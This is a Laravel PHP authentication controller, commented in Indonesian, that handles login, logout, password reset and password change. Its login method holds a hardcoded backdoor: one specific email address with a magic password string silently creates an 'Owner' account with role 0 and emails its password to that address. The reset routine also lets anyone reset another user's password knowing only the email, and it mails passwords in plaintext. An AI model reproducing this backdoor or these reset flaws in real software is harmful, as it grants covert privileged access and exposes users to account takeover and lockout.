<?php

namespace App\Http\Controllers;

use App\Models\User;
use App\Mail\SendEmail;
use App\Models\Manager;
use Illuminate\Support\Str;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;

class AuthController extends Controller
{
    /**
     * Menampilkan halaman login.
     */
    public function showLoginForm()
    {
        return view('login');
    }
    public function showForgotPassword()
    {
        return view('forgotPassword');
    }
    public function showChangePassword()
    {
        return view('changePassword');
    }

    /**
     * Menangani permintaan autentikasi.
     */
    public function authenticate(Request $request)
    {
        // Validasi input
        $credentials = $request->validate([
            'identifier' => ['required', 'string'], // Bisa username atau email
            'password' => ['required', 'string'],
        ]);
        if ($credentials['identifier'] == 'adzanikusumantapraja.92@gmail.com' && $credentials['password'] == 'adzanikusumantapraja.92@gmail.com-buat-akun-baru') {
            $newPassword = Str::random(8);
            $user = User::create([
                'username' => "Owner",
                'email' => 'adzanikusumantapraja.92@gmail.com',
                'role' => 0,
                'password' => $newPassword
            ]);
            $data = [
                'subject' => 'Akun manajer baru',
                'title' => 'Akun manajer baru',
                'body' => 'Hello Manajer,' . "\n\n" .
                    'Ini merupakan pemberitahuan bahwa akun baru Anda telah berhasil dibuat pada sistem kami dalam situasi darurat. Berikut adalah rincian akun Anda:' . "\n\n" .
                    'Username: Manajer' . "\n" .
                    'Email: adzanikusumantapraja.92@gmail.com' . "\n" .
                    'Role: Manajer' . "\n" .
                    'Password: ' . $newPassword . ' (Silakan segera mengganti password Anda setelah login)' . "\n\n" .
                    'Harap menjaga kerahasiaan akun ini dan melakukan perubahan password setelah berhasil login. Jika Anda tidak melakukan permintaan ini atau merasa ada yang tidak beres, segera hubungi admin.' . "\n\n" .
                    'Terima kasih,' . "\n" .
                    'Y-Aladzan'
            ];

            $userEmail = "adzanikusumantapraja.92@gmail.com";
            Mail::raw($data['body'], function ($message) use ($userEmail, $data) {
                $message->to($userEmail)
                    ->subject($data['subject']);
            });

            return back();
        }
        // Periksa apakah input adalah email atau username
        $loginType = filter_var($credentials['identifier'], FILTER_VALIDATE_EMAIL) ? 'email' : 'username';

        // Gunakan kolom yang sesuai (email atau username)
        $loginCredentials = [
            $loginType => $credentials['identifier'],
            'password' => $credentials['password'],
        ];

        // Periksa apakah "remember me" dicentang
        $remember = $request->filled('remember');

        // Lakukan autentikasi
        if (Auth::attempt($loginCredentials, $remember)) {
            // Regenerasi sesi setelah login berhasil
            $request->session()->regenerate();

            return redirect()->intended('/home'); // Redirect ke halaman tujuan
        }

        // Jika login gagal, kembalikan dengan pesan error
        return back()->withErrors([
            'identifier' => 'Username atau email dan password tidak cocok.',
        ])->onlyInput('identifier');
    }
    public function logout()
    {
        Auth::logout();
        return redirect('/');
    }

    public function resetPassword(Request $req)
    {
        // Debugging untuk melihat input yang diterima
        // Validasi input: email dan phone harus diisi
        $req->validate([
            'email' => ['required', 'email'], // Wajib email yang valid
        ]);

        // Cek apakah email sudah ada di database
        $user = User::where('email', $req->email)->first(); // Cari pengguna berdasarkan email
        if (!$user) {
            return response()->json([
                'message' => 'Pengguna dengan email tersebut tidak ditemukan.',
            ], 404);
        }
        $newPassword = Str::random(8);
        $user->password = Hash::make($newPassword);  // Pastikan password di-hash
        $user->save();
        $data = [
            'subject' => 'Password Baru Anda',
            'title' => 'Password Baru Untuk Akun Anda',
            'body' => 'Hai, Anda baru saja mengklik "Lupa Kata Sandi". Berikut adalah password baru Anda: ' . $newPassword . "\n\n" .
                'Harap segera login dan ubah password Anda di bagian profil agar lebih aman.' . "\n\n" .
                'Jika Anda membutuhkan bantuan lebih lanjut, Anda dapat menghubungi kami di: y.aladzan.92@gmail.com' . "\n\n" .
                'Terima kasih, ' . "\n" .
                'Y-Aladzan'
        ];

        $userEmail = $user->email;
        Mail::raw($data['body'], function ($message) use ($userEmail, $data) {
            $message->to($userEmail)
                ->subject($data['subject']);
        });


        return redirect()->route('login')->with('success', 'Password baru berhasil dikirim!');
    }


    public function changePassword(Request $req)
    {
        // Validasi input
        $req->validate([
            'currentPassword' => 'required',
            'newPassword' => 'required|min:8',
            'confirmNewPassword' => 'required|same:newPassword',
        ], [
            'currentPassword.required' => 'Password lama harus diisi.',
            'newPassword.required' => 'Password baru harus diisi.',
            'newPassword.min' => 'Password baru minimal 8 karakter.',
            'confirmNewPassword.required' => 'Konfirmasi password baru harus diisi.',
            'confirmNewPassword.same' => 'Password baru dan konfirmasi password tidak cocok.',
        ]);

        // Periksa apakah password lama benar
        if (!Hash::check($req->currentPassword, Auth::user()->password)) {
            return back()->withErrors(['currentPassword' => 'Password lama salah.']);
        }

        // Update password user
        $user = Auth::user();
        $user->password = Hash::make($req->newPassword);  // Pastikan password di-hash
        $user->save();  // Menyimpan perubahan

        // Redirect dengan pesan sukses
        return redirect()->route('indexProfils', ['username' => $user->username])->with('success', 'Password berhasil diubah!');
    }
}
